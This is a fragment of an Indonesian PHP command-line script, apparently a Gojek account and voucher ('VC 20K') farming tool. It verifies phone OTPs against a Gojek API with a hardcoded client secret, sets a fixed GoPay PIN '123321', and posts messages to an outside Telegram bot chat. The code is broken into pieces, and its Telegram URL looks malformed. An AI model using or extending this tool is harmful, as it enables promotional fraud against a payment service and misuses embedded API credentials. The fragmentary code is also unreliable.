...
ulang:
// function change(){
echo "\e[93m<=====SIGILA=====SIGILA===SIGILA=====> \n";
echo "\e[32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
echo "\e[32m         SIGILA       \n";
echo "\e[93m  ===================================== \n";
echo "\e[93m         INGAT     \n";
echo "\e[96m         DI ATAS LANGIT MASIH ADA LANGIT\n";
echo "\e[93m  ======================================\n";
echo "\e[93m       \e[32m VC 20K \e[93m \n";
echo "\e[93m  =====================================\n";
echo "\e[32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
        $nama = nama();
        ...
        otp:
        echo color("red","[+]OTPNYABRO : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("blue"," [√]BERHASIL BRO\n");
	...
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/gadamasbro" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
         ...
         echo color("red","[+] PIN GOPAY KAMU 123321 ")."\n";
         $data2 = '{"pin":"123321"}';
